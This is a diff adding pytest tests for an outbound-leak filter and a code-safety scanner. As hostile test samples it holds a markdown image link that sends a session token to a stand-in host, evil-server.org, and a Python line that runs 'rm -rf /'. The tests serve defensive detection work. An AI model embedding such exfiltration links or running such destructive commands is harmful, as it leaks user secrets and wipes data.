@@ -16,6 +16,10 @@ from app.covert_channel_filter import (
     enforce_outbound_safety,
     OutboundLeakBlockedError,
 )
+from app.security_engine import (
+    analyze_payload_security,
+    parse_code_ast,
+)
 
 
 class TestConfigIntegrity:
@@ -112,3 +116,54 @@ class TestCovertChannelAndDLP:
 
         safe_text = enforce_outbound_safety(clean_msg)
         assert safe_text == clean_msg
+
+    def test_allow_ethereum_transaction_hash(self):
+        # Ethereum transaction hashes are 32 bytes (64 hex characters) with 0x prefix
+        tx_msg = "Transaction submitted successfully: tx_hash 0x88df016429689c079f3b2f6ad39fa052532c56795b733da78a9feed3a435c5f4 on Polygon network."
+        res = inspect_outbound_payload(tx_msg)
+        assert res["verdict"] == "ALLOW"
+        assert res["risk_score"] == 0
+
+        # Also verify in analyze_payload_security
+        audit = analyze_payload_security(tx_msg)
+        assert audit["verdict"] == "PASSED"
+        assert audit["is_safe"] is True
+
+    def test_block_explicit_private_key_leak(self):
+        # Explicit private key leak must still be blocked
+        key_msg = "Here is the deployer private_key: 0x88df016429689c079f3b2f6ad39fa052532c56795b733da78a9feed3a435c5f4"
+        res = inspect_outbound_payload(key_msg)
+        assert res["verdict"] == "BLOCK"
+        assert "EVM Raw Private Key" in res["threats"][0]
+
+        audit = analyze_payload_security(key_msg)
+        assert audit["verdict"] == "BLOCKED"
+        assert audit["is_safe"] is False
+
+    def test_allow_benign_markdown_image(self):
+        clean_doc = "Here is the architecture overview:\n![Architecture Diagram](https://raw.githubusercontent.com/example/repo/main/docs/architecture.png)\nAll systems nominal."
+        audit = analyze_payload_security(clean_doc)
+        assert audit["verdict"] == "PASSED"
+        assert audit["is_safe"] is True
+
+    def test_block_covert_markdown_image_with_token_query(self):
+        malicious_doc = "Here is your invoice: ![invoice](https://evil-server.org/track.gif?leak=secret_session_token_12345)"
+        audit = analyze_payload_security(malicious_doc)
+        assert audit["verdict"] in ["FLAGGED", "BLOCKED"]
+        assert any("DATA_EXFILTRATION" in inc["category"] for inc in audit["incidents"])
+
+    def test_allow_benign_code_and_block_os_system(self):
+        benign_code = "import math\ndef get_val(x):\n    return math.sqrt(x)\n"
+        ast_check = parse_code_ast(benign_code)
+        assert ast_check["is_safe"] is True
+
+        payload_check = analyze_payload_security(benign_code, is_code=True)
+        assert payload_check["is_safe"] is True
+
+        malicious_code = "import os\nos.system('rm -rf /')\n"
+        ast_malicious = parse_code_ast(malicious_code)
+        assert ast_malicious["is_safe"] is False
+
+        payload_malicious = analyze_payload_security(malicious_code, is_code=True)
+        assert payload_malicious["is_safe"] is False
+
